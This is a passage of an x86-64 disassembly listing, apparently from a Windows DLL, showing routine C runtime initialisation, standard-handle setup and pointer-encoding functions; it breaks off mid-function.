   180008ae8:	75 20                	jne    0x180008b0a
   180008aea:	4c 8d 0d 87 88 00 00 	lea    0x8887(%rip),%r9        # 0x180011378
   180008af1:	4c 8d 05 78 88 00 00 	lea    0x8878(%rip),%r8        # 0x180011370
   180008af8:	48 8d 15 79 88 00 00 	lea    0x8879(%rip),%rdx        # 0x180011378
   180008aff:	8d 48 03             	lea    0x3(%rax),%ecx
   180008b02:	e8 b1 fb ff ff       	call   0x1800086b8
   180008b07:	48 85 c0             	test   %rax,%rax
   180008b0a:	0f 95 c0             	setne  %al
   180008b0d:	48 83 c4 28          	add    $0x28,%rsp
   180008b11:	c3                   	ret
   180008b12:	cc                   	int3
   180008b13:	cc                   	int3
   180008b14:	40 53                	rex push %rbx
   180008b16:	48 83 ec 20          	sub    $0x20,%rsp
   180008b1a:	84 c9                	test   %cl,%cl
   180008b1c:	75 2f                	jne    0x180008b4d
   180008b1e:	48 8d 1d eb 24 01 00 	lea    0x124eb(%rip),%rbx        # 0x18001b010
   180008b25:	48 8b 0b             	mov    (%rbx),%rcx
   180008b28:	48 85 c9             	test   %rcx,%rcx
   180008b2b:	74 10                	je     0x180008b3d
   180008b2d:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   180008b31:	74 06                	je     0x180008b39
   180008b33:	ff 15 bf 65 00 00    	call   *0x65bf(%rip)        # 0x18000f0f8
   180008b39:	48 83 23 00          	andq   $0x0,(%rbx)
   180008b3d:	48 83 c3 08          	add    $0x8,%rbx
   180008b41:	48 8d 05 80 25 01 00 	lea    0x12580(%rip),%rax        # 0x18001b0c8
   180008b48:	48 3b d8             	cmp    %rax,%rbx
   180008b4b:	75 d8                	jne    0x180008b25
   180008b4d:	b0 01                	mov    $0x1,%al
   180008b4f:	48 83 c4 20          	add    $0x20,%rsp
   180008b53:	5b                   	pop    %rbx
   180008b54:	c3                   	ret
   180008b55:	cc                   	int3
   180008b56:	cc                   	int3
   180008b57:	cc                   	int3
   180008b58:	cc                   	int3
   180008b59:	cc                   	int3
   180008b5a:	cc                   	int3
   180008b5b:	cc                   	int3
   180008b5c:	cc                   	int3
   180008b5d:	cc                   	int3
   180008b5e:	cc                   	int3
   180008b5f:	cc                   	int3
   180008b60:	48 8b 05 61 25 01 00 	mov    0x12561(%rip),%rax        # 0x18001b0c8
   180008b67:	c3                   	ret
   180008b68:	cc                   	int3
   180008b69:	cc                   	int3
   180008b6a:	cc                   	int3
   180008b6b:	cc                   	int3
   180008b6c:	cc                   	int3
   180008b6d:	cc                   	int3
   180008b6e:	cc                   	int3
   180008b6f:	cc                   	int3
   180008b70:	48 83 ec 28          	sub    $0x28,%rsp
   180008b74:	ff 15 56 66 00 00    	call   *0x6656(%rip)        # 0x18000f1d0
   180008b7a:	48 85 c0             	test   %rax,%rax
   180008b7d:	48 89 05 44 25 01 00 	mov    %rax,0x12544(%rip)        # 0x18001b0c8
   180008b84:	0f 95 c0             	setne  %al
   180008b87:	48 83 c4 28          	add    $0x28,%rsp
   180008b8b:	c3                   	ret
   180008b8c:	cc                   	int3
   180008b8d:	cc                   	int3
   180008b8e:	cc                   	int3
   180008b8f:	cc                   	int3
   180008b90:	cc                   	int3
   180008b91:	cc                   	int3
   180008b92:	cc                   	int3
   180008b93:	cc                   	int3
   180008b94:	cc                   	int3
   180008b95:	cc                   	int3
   180008b96:	cc                   	int3
   180008b97:	cc                   	int3
   180008b98:	cc                   	int3
   180008b99:	cc                   	int3
   180008b9a:	cc                   	int3
   180008b9b:	cc                   	int3
   180008b9c:	cc                   	int3
   180008b9d:	cc                   	int3
   180008b9e:	cc                   	int3
   180008b9f:	cc                   	int3
   180008ba0:	48 83 25 20 25 01 00 	andq   $0x0,0x12520(%rip)        # 0x18001b0c8
   180008ba7:	00 
   180008ba8:	b0 01                	mov    $0x1,%al
   180008baa:	c3                   	ret
   180008bab:	cc                   	int3
   180008bac:	cc                   	int3
   180008bad:	cc                   	int3
   180008bae:	cc                   	int3
   180008baf:	cc                   	int3
   180008bb0:	cc                   	int3
   180008bb1:	cc                   	int3
   180008bb2:	cc                   	int3
   180008bb3:	cc                   	int3
   180008bb4:	cc                   	int3
   180008bb5:	cc                   	int3
   180008bb6:	cc                   	int3
   180008bb7:	cc                   	int3
   180008bb8:	cc                   	int3
   180008bb9:	cc                   	int3
   180008bba:	cc                   	int3
   180008bbb:	cc                   	int3
   180008bbc:	cc                   	int3
   180008bbd:	cc                   	int3
   180008bbe:	cc                   	int3
   180008bbf:	cc                   	int3
   180008bc0:	48 8b 05 01 25 01 00 	mov    0x12501(%rip),%rax        # 0x18001b0c8
   180008bc7:	c3                   	ret
   180008bc8:	48 8b c4             	mov    %rsp,%rax
   180008bcb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180008bcf:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180008bd3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180008bd7:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180008bdb:	41 56                	push   %r14
   180008bdd:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   180008be4:	33 d2                	xor    %edx,%edx
   180008be6:	48 8d 48 88          	lea    -0x78(%rax),%rcx
   180008bea:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   180008bee:	e8 bd 4d 00 00       	call   0x18000d9b0
   180008bf3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180008bf8:	ff 15 52 64 00 00    	call   *0x6452(%rip)        # 0x18000f050
   180008bfe:	45 33 f6             	xor    %r14d,%r14d
   180008c01:	66 44 39 74 24 62    	cmp    %r14w,0x62(%rsp)
   180008c07:	0f 84 9a 00 00 00    	je     0x180008ca7
   180008c0d:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   180008c12:	48 85 c0             	test   %rax,%rax
   180008c15:	0f 84 8c 00 00 00    	je     0x180008ca7
   180008c1b:	48 63 18             	movslq (%rax),%rbx
   180008c1e:	48 8d 70 04          	lea    0x4(%rax),%rsi
   180008c22:	bf 00 20 00 00       	mov    $0x2000,%edi
   180008c27:	48 03 de             	add    %rsi,%rbx
   180008c2a:	39 38                	cmp    %edi,(%rax)
   180008c2c:	0f 4c 38             	cmovl  (%rax),%edi
   180008c2f:	8b cf                	mov    %edi,%ecx
   180008c31:	e8 a6 2a 00 00       	call   0x18000b6dc
   180008c36:	3b 3d 94 28 01 00    	cmp    0x12894(%rip),%edi        # 0x18001b4d0
   180008c3c:	0f 4f 3d 8d 28 01 00 	cmovg  0x1288d(%rip),%edi        # 0x18001b4d0
   180008c43:	85 ff                	test   %edi,%edi
   180008c45:	74 60                	je     0x180008ca7
   180008c47:	41 8b ee             	mov    %r14d,%ebp
   180008c4a:	48 83 3b ff          	cmpq   $0xffffffffffffffff,(%rbx)
   180008c4e:	74 47                	je     0x180008c97
   180008c50:	48 83 3b fe          	cmpq   $0xfffffffffffffffe,(%rbx)
   180008c54:	74 41                	je     0x180008c97
   180008c56:	f6 06 01             	testb  $0x1,(%rsi)
   180008c59:	74 3c                	je     0x180008c97
   180008c5b:	f6 06 08             	testb  $0x8,(%rsi)
   180008c5e:	75 0d                	jne    0x180008c6d
   180008c60:	48 8b 0b             	mov    (%rbx),%rcx
   180008c63:	ff 15 77 65 00 00    	call   *0x6577(%rip)        # 0x18000f1e0
   180008c69:	85 c0                	test   %eax,%eax
   180008c6b:	74 2a                	je     0x180008c97
   180008c6d:	48 8b c5             	mov    %rbp,%rax
   180008c70:	4c 8d 05 59 24 01 00 	lea    0x12459(%rip),%r8        # 0x18001b0d0
   180008c77:	48 8b cd             	mov    %rbp,%rcx
   180008c7a:	48 c1 f9 06          	sar    $0x6,%rcx
   180008c7e:	83 e0 3f             	and    $0x3f,%eax
   180008c81:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   180008c85:	48 8d 14 c0          	lea    (%rax,%rax,8),%rdx
   180008c89:	48 8b 03             	mov    (%rbx),%rax
   180008c8c:	48 89 44 d1 28       	mov    %rax,0x28(%rcx,%rdx,8)
   180008c91:	8a 06                	mov    (%rsi),%al
   180008c93:	88 44 d1 38          	mov    %al,0x38(%rcx,%rdx,8)
   180008c97:	48 ff c5             	inc    %rbp
   180008c9a:	48 ff c6             	inc    %rsi
   180008c9d:	48 83 c3 08          	add    $0x8,%rbx
   180008ca1:	48 83 ef 01          	sub    $0x1,%rdi
   180008ca5:	75 a3                	jne    0x180008c4a
   180008ca7:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   180008cae:	00 
   180008caf:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   180008cb3:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   180008cb7:	49 8b 73 20          	mov    0x20(%r11),%rsi
   180008cbb:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   180008cbf:	49 8b e3             	mov    %r11,%rsp
   180008cc2:	41 5e                	pop    %r14
   180008cc4:	c3                   	ret
   180008cc5:	cc                   	int3
   180008cc6:	cc                   	int3
   180008cc7:	cc                   	int3
   180008cc8:	48 8b c4             	mov    %rsp,%rax
   180008ccb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180008ccf:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180008cd3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180008cd7:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180008cdb:	41 56                	push   %r14
   180008cdd:	48 83 ec 20          	sub    $0x20,%rsp
   180008ce1:	33 f6                	xor    %esi,%esi
   180008ce3:	45 33 f6             	xor    %r14d,%r14d
   180008ce6:	48 63 ce             	movslq %esi,%rcx
   180008ce9:	48 8d 3d e0 23 01 00 	lea    0x123e0(%rip),%rdi        # 0x18001b0d0
   180008cf0:	48 8b c1             	mov    %rcx,%rax
   180008cf3:	83 e1 3f             	and    $0x3f,%ecx
   180008cf6:	48 c1 f8 06          	sar    $0x6,%rax
   180008cfa:	48 8d 1c c9          	lea    (%rcx,%rcx,8),%rbx
   180008cfe:	48 8b 3c c7          	mov    (%rdi,%rax,8),%rdi
   180008d02:	48 8b 44 df 28       	mov    0x28(%rdi,%rbx,8),%rax
   180008d07:	48 83 c0 02          	add    $0x2,%rax
   180008d0b:	48 83 f8 01          	cmp    $0x1,%rax
   180008d0f:	76 0a                	jbe    0x180008d1b
   180008d11:	80 4c df 38 80       	orb    $0x80,0x38(%rdi,%rbx,8)
   180008d16:	e9 8b 00 00 00       	jmp    0x180008da6
   180008d1b:	c6 44 df 38 81       	movb   $0x81,0x38(%rdi,%rbx,8)
   180008d20:	8b ce                	mov    %esi,%ecx
   180008d22:	85 f6                	test   %esi,%esi
   180008d24:	74 16                	je     0x180008d3c
   180008d26:	83 e9 01             	sub    $0x1,%ecx
   180008d29:	74 0a                	je     0x180008d35
   180008d2b:	83 f9 01             	cmp    $0x1,%ecx
   180008d2e:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   180008d33:	eb 0c                	jmp    0x180008d41
   180008d35:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   180008d3a:	eb 05                	jmp    0x180008d41
   180008d3c:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   180008d41:	ff 15 91 64 00 00    	call   *0x6491(%rip)        # 0x18000f1d8
   180008d47:	48 8b e8             	mov    %rax,%rbp
   180008d4a:	48 8d 48 01          	lea    0x1(%rax),%rcx
   180008d4e:	48 83 f9 01          	cmp    $0x1,%rcx
   180008d52:	76 2d                	jbe    0x180008d81
   180008d54:	48 8b c8             	mov    %rax,%rcx
   180008d57:	ff 15 83 64 00 00    	call   *0x6483(%rip)        # 0x18000f1e0
   180008d5d:	85 c0                	test   %eax,%eax
   180008d5f:	74 20                	je     0x180008d81
   180008d61:	0f b6 c0             	movzbl %al,%eax
   180008d64:	48 89 6c df 28       	mov    %rbp,0x28(%rdi,%rbx,8)
   180008d69:	83 f8 02             	cmp    $0x2,%eax
   180008d6c:	75 07                	jne    0x180008d75
   180008d6e:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   180008d73:	eb 31                	jmp    0x180008da6
   180008d75:	83 f8 03             	cmp    $0x3,%eax
   180008d78:	75 2c                	jne    0x180008da6
   180008d7a:	80 4c df 38 08       	orb    $0x8,0x38(%rdi,%rbx,8)
   180008d7f:	eb 25                	jmp    0x180008da6
   180008d81:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   180008d86:	48 c7 44 df 28 fe ff 	movq   $0xfffffffffffffffe,0x28(%rdi,%rbx,8)
   180008d8d:	ff ff 
   180008d8f:	48 8b 05 7a 27 01 00 	mov    0x1277a(%rip),%rax        # 0x18001b510
   180008d96:	48 85 c0             	test   %rax,%rax
   180008d99:	74 0b                	je     0x180008da6
   180008d9b:	49 8b 04 06          	mov    (%r14,%rax,1),%rax
   180008d9f:	c7 40 18 fe ff ff ff 	movl   $0xfffffffe,0x18(%rax)
   180008da6:	ff c6                	inc    %esi
   180008da8:	49 83 c6 08          	add    $0x8,%r14
   180008dac:	83 fe 03             	cmp    $0x3,%esi
   180008daf:	0f 85 31 ff ff ff    	jne    0x180008ce6
   180008db5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180008dba:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180008dbf:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180008dc4:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   180008dc9:	48 83 c4 20          	add    $0x20,%rsp
   180008dcd:	41 5e                	pop    %r14
   180008dcf:	c3                   	ret
   180008dd0:	40 53                	rex push %rbx
   180008dd2:	48 83 ec 20          	sub    $0x20,%rsp
   180008dd6:	b9 07 00 00 00       	mov    $0x7,%ecx
   180008ddb:	e8 38 db ff ff       	call   0x180006918
   180008de0:	33 db                	xor    %ebx,%ebx
   180008de2:	33 c9                	xor    %ecx,%ecx
   180008de4:	e8 f3 28 00 00       	call   0x18000b6dc
   180008de9:	85 c0                	test   %eax,%eax
   180008deb:	75 0c                	jne    0x180008df9
   180008ded:	e8 d6 fd ff ff       	call   0x180008bc8
   180008df2:	e8 d1 fe ff ff       	call   0x180008cc8
   180008df7:	b3 01                	mov    $0x1,%bl
   180008df9:	b9 07 00 00 00       	mov    $0x7,%ecx
   180008dfe:	e8 69 db ff ff       	call   0x18000696c
   180008e03:	8a c3                	mov    %bl,%al
   180008e05:	48 83 c4 20          	add    $0x20,%rsp
   180008e09:	5b                   	pop    %rbx
   180008e0a:	c3                   	ret
   180008e0b:	cc                   	int3
   180008e0c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180008e11:	57                   	push   %rdi
   180008e12:	48 83 ec 20          	sub    $0x20,%rsp
   180008e16:	33 db                	xor    %ebx,%ebx
   180008e18:	48 8d 3d b1 22 01 00 	lea    0x122b1(%rip),%rdi        # 0x18001b0d0
   180008e1f:	48 8b 0c 3b          	mov    (%rbx,%rdi,1),%rcx
   180008e23:	48 85 c9             	test   %rcx,%rcx
   180008e26:	74 0a                	je     0x180008e32
   180008e28:	e8 5f 28 00 00       	call   0x18000b68c
   180008e2d:	48 83 24 3b 00       	andq   $0x0,(%rbx,%rdi,1)
   180008e32:	48 83 c3 08          	add    $0x8,%rbx
   180008e36:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
   180008e3d:	72 d9                	jb     0x180008e18
   180008e3f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180008e44:	b0 01                	mov    $0x1,%al
   180008e46:	48 83 c4 20          	add    $0x20,%rsp
   180008e4a:	5f                   	pop    %rdi
   180008e4b:	c3                   	ret
   180008e4c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180008e51:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180008e56:	57                   	push   %rdi
   180008e57:	48 83 ec 20          	sub    $0x20,%rsp
   180008e5b:	48 8b f2             	mov    %rdx,%rsi
   180008e5e:	48 8b f9             	mov    %rcx,%rdi
   180008e61:	48 3b ca             	cmp    %rdx,%rcx
   180008e64:	74 52                	je     0x180008eb8
   180008e66:	48 8b d9             	mov    %rcx,%rbx
   180008e69:	48 8b 03             	mov    (%rbx),%rax
   180008e6c:	48 85 c0             	test   %rax,%rax
   180008e6f:	74 09                	je     0x180008e7a
   180008e71:	e8 ba 43 00 00       	call   0x18000d230
   180008e76:	84 c0                	test   %al,%al
   180008e78:	74 09                	je     0x180008e83
   180008e7a:	48 83 c3 10          	add    $0x10,%rbx
   180008e7e:	48 3b de             	cmp    %rsi,%rbx
   180008e81:	75 e6                	jne    0x180008e69
   180008e83:	48 3b de             	cmp    %rsi,%rbx
   180008e86:	74 30                	je     0x180008eb8
   180008e88:	48 3b df             	cmp    %rdi,%rbx
   180008e8b:	74 27                	je     0x180008eb4
   180008e8d:	48 83 c3 f8          	add    $0xfffffffffffffff8,%rbx
   180008e91:	48 83 7b f8 00       	cmpq   $0x0,-0x8(%rbx)
   180008e96:	74 0f                	je     0x180008ea7
   180008e98:	48 8b 03             	mov    (%rbx),%rax
   180008e9b:	48 85 c0             	test   %rax,%rax
   180008e9e:	74 07                	je     0x180008ea7
   180008ea0:	33 c9                	xor    %ecx,%ecx
   180008ea2:	e8 89 43 00 00       	call   0x18000d230
   180008ea7:	48 83 eb 10          	sub    $0x10,%rbx
   180008eab:	48 8d 43 08          	lea    0x8(%rbx),%rax
   180008eaf:	48 3b c7             	cmp    %rdi,%rax
   180008eb2:	75 dd                	jne    0x180008e91
   180008eb4:	32 c0                	xor    %al,%al
   180008eb6:	eb 02                	jmp    0x180008eba
   180008eb8:	b0 01                	mov    $0x1,%al
   180008eba:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180008ebf:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180008ec4:	48 83 c4 20          	add    $0x20,%rsp
   180008ec8:	5f                   	pop    %rdi
   180008ec9:	c3                   	ret
   180008eca:	cc                   	int3
   180008ecb:	cc                   	int3
   180008ecc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180008ed1:	57                   	push   %rdi
   180008ed2:	48 83 ec 20          	sub    $0x20,%rsp
   180008ed6:	48 8b da             	mov    %rdx,%rbx
   180008ed9:	48 8b f9             	mov    %rcx,%rdi
   180008edc:	48 3b ca             	cmp    %rdx,%rcx
   180008edf:	74 19                	je     0x180008efa
   180008ee1:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   180008ee5:	48 85 c0             	test   %rax,%rax
   180008ee8:	74 07                	je     0x180008ef1
   180008eea:	33 c9                	xor    %ecx,%ecx
   180008eec:	e8 3f 43 00 00       	call   0x18000d230
   180008ef1:	48 83 eb 10          	sub    $0x10,%rbx
   180008ef5:	48 3b df             	cmp    %rdi,%rbx
   180008ef8:	75 e7                	jne    0x180008ee1
   180008efa:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180008eff:	b0 01                	mov    $0x1,%al
   180008f01:	48 83 c4 20          	add    $0x20,%rsp
   180008f05:	5f                   	pop    %rdi
   180008f06:	c3                   	ret
   180008f07:	cc                   	int3
   180008f08:	cc                   	int3
   180008f09:	cc                   	int3
   180008f0a:	cc                   	int3
   180008f0b:	cc                   	int3
   180008f0c:	cc                   	int3
   180008f0d:	cc                   	int3
   180008f0e:	cc                   	int3
   180008f0f:	cc                   	int3
   180008f10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180008f15:	57                   	push   %rdi
   180008f16:	48 83 ec 20          	sub    $0x20,%rsp
   180008f1a:	48 8b f9             	mov    %rcx,%rdi
   180008f1d:	e8 3e 00 00 00       	call   0x180008f60
   180008f22:	33 db                	xor    %ebx,%ebx
   180008f24:	48 85 c0             	test   %rax,%rax
   180008f27:	74 0f                	je     0x180008f38
   180008f29:	48 8b cf             	mov    %rdi,%rcx
   180008f2c:	e8 ff 42 00 00       	call   0x18000d230
   180008f31:	85 c0                	test   %eax,%eax
   180008f33:	0f 95 c3             	setne  %bl
   180008f36:	8b c3                	mov    %ebx,%eax
   180008f38:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180008f3d:	48 83 c4 20          	add    $0x20,%rsp
   180008f41:	5f                   	pop    %rdi
   180008f42:	c3                   	ret
   180008f43:	cc                   	int3
   180008f44:	cc                   	int3
   180008f45:	cc                   	int3
   180008f46:	cc                   	int3
   180008f47:	cc                   	int3
   180008f48:	cc                   	int3
   180008f49:	cc                   	int3
   180008f4a:	cc                   	int3
   180008f4b:	cc                   	int3
   180008f4c:	cc                   	int3
   180008f4d:	cc                   	int3
   180008f4e:	cc                   	int3
   180008f4f:	cc                   	int3
   180008f50:	48 89 0d 81 25 01 00 	mov    %rcx,0x12581(%rip)        # 0x18001b4d8
   180008f57:	c3                   	ret
   180008f58:	cc                   	int3
   180008f59:	cc                   	int3
   180008f5a:	cc                   	int3
   180008f5b:	cc                   	int3
   180008f5c:	cc                   	int3
   180008f5d:	cc                   	int3
   180008f5e:	cc                   	int3
   180008f5f:	cc                   	int3
   180008f60:	40 53                	rex push %rbx
   180008f62:	48 83 ec 20          	sub    $0x20,%rsp
   180008f66:	33 c9                	xor    %ecx,%ecx
   180008f68:	e8 ab d9 ff ff       	call   0x180006918
   180008f6d:	90                   	nop
   180008f6e:	48 8b 05 8b 10 01 00 	mov    0x1108b(%rip),%rax        # 0x18001a000
   180008f75:	8b c8                	mov    %eax,%ecx
   180008f77:	83 e1 3f             	and    $0x3f,%ecx
   180008f7a:	48 8b 1d 57 25 01 00 	mov    0x12557(%rip),%rbx        # 0x18001b4d8
   180008f81:	48 33 d8             	xor    %rax,%rbx
   180008f84:	48 d3 cb             	ror    %cl,%rbx
   180008f87:	33 c9                	xor    %ecx,%ecx
   180008f89:	e8 de d9 ff ff       	call   0x18000696c
   180008f8e:	48 8b c3             	mov    %rbx,%rax
   180008f91:	48 83 c4 20          	add    $0x20,%rsp
   180008f95:	5b                   	pop    %rbx
   180008f96:	c3                   	ret
   180008f97:	cc                   	int3
   180008f98:	cc                   	int3
   180008f99:	cc                   	int3
   180008f9a:	cc                   	int3
   180008f9b:	cc                   	int3
   180008f9c:	cc                   	int3
   180008f9d:	cc                   	int3
   180008f9e:	cc                   	int3
   180008f9f:	cc                   	int3
   180008fa0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180008fa5:	57                   	push   %rdi
   180008fa6:	48 83 ec 20          	sub    $0x20,%rsp
   180008faa:	48 8b f9             	mov    %rcx,%rdi
   180008fad:	33 c9                	xor    %ecx,%ecx
   180008faf:	e8 64 d9 ff ff       	call   0x180006918
   180008fb4:	90                   	nop
   180008fb5:	48 8b 15 44 10 01 00 	mov    0x11044(%rip),%rdx        # 0x18001a000
   180008fbc:	8b c2                	mov    %edx,%eax
   180008fbe:	83 e0 3f             	and    $0x3f,%eax
   180008fc1:	48 8b da             	mov    %rdx,%rbx
   180008fc4:	48 33 1d 0d 25 01 00 	xor    0x1250d(%rip),%rbx        # 0x18001b4d8
   180008fcb:	8b c8                	mov    %eax,%ecx
   180008fcd:	48 d3 cb             	ror    %cl,%rbx
   180008fd0:	b9 40 00 00 00       	mov    $0x40,%ecx
   180008fd5:	2b c8                	sub    %eax,%ecx
   180008fd7:	48 d3 cf             	ror    %cl,%rdi
   180008fda:	48 33 fa             	xor    %rdx,%rdi
   180008fdd:	48 89 3d f4 24 01 00 	mov    %rdi,0x124f4(%rip)        # 0x18001b4d8
   180008fe4:	33 c9                	xor    %ecx,%ecx
   180008fe6:	e8 81 d9 ff ff       	call   0x18000696c
   180008feb:	48 8b c3             	mov    %rbx,%rax
   180008fee:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180008ff3:	48 83 c4 20          	add    $0x20,%rsp
   180008ff7:	5f                   	pop    %rdi
   180008ff8:	c3                   	ret
   180008ff9:	cc                   	int3
   180008ffa:	cc                   	int3
   180008ffb:	cc                   	int3
   180008ffc:	cc                   	int3
   180008ffd:	cc                   	int3
   180008ffe:	cc                   	int3
   180008fff:	cc                   	int3
   180009000:	48 8b 0d f9 0f 01 00 	mov    0x10ff9(%rip),%rcx        # 0x18001a000
   180009007:	e9 94 ff ff ff       	jmp    0x180008fa0
   18000900c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180009011:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180009016:	57                   	push   %rdi
   180009017:	48 83 ec 20          	sub    $0x20,%rsp
   18000901b:	49 8b f9             	mov    %r9,%rdi
   18000901e:	8b 0a                	mov    (%rdx),%ecx
   180009020:	e8 f3 d8 ff ff       	call   0x180006918
   180009025:	90                   	nop
   180009026:	48 8b 05 d3 0f 01 00 	mov    0x10fd3(%rip),%rax        # 0x18001a000
   18000902d:	8b c8                	mov    %eax,%ecx
   18000902f:	83 e1 3f             	and    $0x3f,%ecx
   180009032:	48 8b 1d b7 24 01 00 	mov    0x124b7(%rip),%rbx        # 0x18001b4f0
   180009039:	48 33 d8             	xor    %rax,%rbx
   18000903c:	48 d3 cb             	ror    %cl,%rbx
   18000903f:	8b 0f                	mov    (%rdi),%ecx
   180009041:	e8 26 d9 ff ff       	call   0x18000696c
   180009046:	48 8b c3             	mov    %rbx,%rax
   180009049:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000904e:	48 83 c4 20          	add    $0x20,%rsp
   180009052:	5f                   	pop    %rdi
   180009053:	c3                   	ret
   180009054:	4c 8b dc             	mov    %rsp,%r11
   180009057:	48 83 ec 28          	sub    $0x28,%rsp
   18000905b:	b8 03 00 00 00       	mov    $0x3,%eax
   180009060:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   180009064:	4d 8d 43 08          	lea    0x8(%r11),%r8
   180009068:	89 44 24 38          	mov    %eax,0x38(%rsp)
   18000906c:	49 8d 53 18          	lea    0x18(%r11),%rdx
   180009070:	89 44 24 40          	mov    %eax,0x40(%rsp)
   180009074:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   180009078:	e8 8f ff ff ff       	call   0x18000900c
   18000907d:	48 83 c4 28          	add    $0x28,%rsp
   180009081:	c3                   	ret
   180009082:	cc                   	int3
   180009083:	cc                   	int3
   180009084:	48 89 0d 55 24 01 00 	mov    %rcx,0x12455(%rip)        # 0x18001b4e0
   18000908b:	48 89 0d 56 24 01 00 	mov    %rcx,0x12456(%rip)        # 0x18001b4e8
   180009092:	48 89 0d 57 24 01 00 	mov    %rcx,0x12457(%rip)        # 0x18001b4f0
   180009099:	48 89 0d 58 24 01 00 	mov    %rcx,0x12458(%rip)        # 0x18001b4f8
   1800090a0:	c3                   	ret
   1800090a1:	cc                   	int3
   1800090a2:	cc                   	int3
   1800090a3:	cc                   	int3
   1800090a4:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1800090a9:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1800090ae:	57                   	push   %rdi
   1800090af:	41 54                	push   %r12
   1800090b1:	41 55                	push   %r13
   1800090b3:	41 56                	push   %r14
   1800090b5:	41 57                	push   %r15
   1800090b7:	48 83 ec 40          	sub    $0x40,%rsp
   1800090bb:	8b d9                	mov    %ecx,%ebx
   1800090bd:	45 33 ff             	xor    %r15d,%r15d
   1800090c0:	44 21 7c 24 78       	and    %r15d,0x78(%rsp)
   1800090c5:	41 b6 01             	mov    $0x1,%r14b
   1800090c8:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   1800090cd:	8b d1                	mov    %ecx,%edx
   1800090cf:	83 ea 02             	sub    $0x2,%edx
   1800090d2:	74 27                	je     0x1800090fb
   1800090d4:	83 ea 02             	sub    $0x2,%edx
   1800090d7:	74 52                	je     0x18000912b
   1800090d9:	83 ea 02             	sub    $0x2,%edx
   1800090dc:	74 1d                	je     0x1800090fb
   1800090de:	83 ea 02             	sub    $0x2,%edx
   1800090e1:	74 48                	je     0x18000912b
   1800090e3:	83 ea 03             	sub    $0x3,%edx
   1800090e6:	74 43                	je     0x18000912b
   1800090e8:	83 ea 04             	sub    $0x4,%edx
   1800090eb:	74 0e                	je     0x1800090fb
   1800090ed:	83 ea 06             	sub    $0x6,%edx
   1800090f0:	74 09                	je     0x1800090fb
   1800090f2:	83 fa 01             	cmp    $0x1,%edx
   1800090f5:	0f 85 82 00 00 00    	jne    0x18000917d
   1800090fb:	83 e9 02             	sub    $0x2,%ecx
   1800090fe:	0f 84 b4 00 00 00    	je     0x1800091b8
   180009104:	83 e9 04             	sub    $0x4,%ecx
   180009107:	0f 84 90 00 00 00    	je     0x18000919d
   18000910d:	83 e9 09             	sub    $0x9,%ecx
   180009110:	0f 84 99 00 00 00    	je     0x1800091af
   180009116:	83 e9 06             	sub    $0x6,%ecx
   180009119:	0f 84 87 00 00 00    	je     0x1800091a6
   18000911f:	83 f9 01             	cmp    $0x1,%ecx
   180009122:	74 79                	je     0x18000919d
   180009124:	33 ff                	xor    %edi,%edi
   180009126:	e9 94 00 00 00       	jmp    0x1800091bf
   18000912b:	e8 c8 d4 ff ff       	call   0x1800065f8
   180009130:	4c 8b f8             	mov    %rax,%r15
   180009133:	48 85 c0             	test   %rax,%rax
   180009136:	75 1d                	jne    0x180009155
   180009138:	83 c8 ff             	or     $0xffffffff,%eax
   18000913b:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   180009140:	49 8b 5b 40          	mov    0x40(%r11),%rbx
   180009144:	49 8b 73 48          	mov    0x48(%r11),%rsi
   180009148:	49 8b e3             	mov    %r11,%rsp
   18000914b:	41 5f                	pop    %r15
   18000914d:	41 5e                	pop    %r14
   18000914f:	41 5d                	pop    %r13
   180009151:	41 5c                	pop    %r12
   180009153:	5f                   	pop    %rdi
   180009154:	c3                   	ret
   180009155:	48 8b 00             	mov    (%rax),%rax
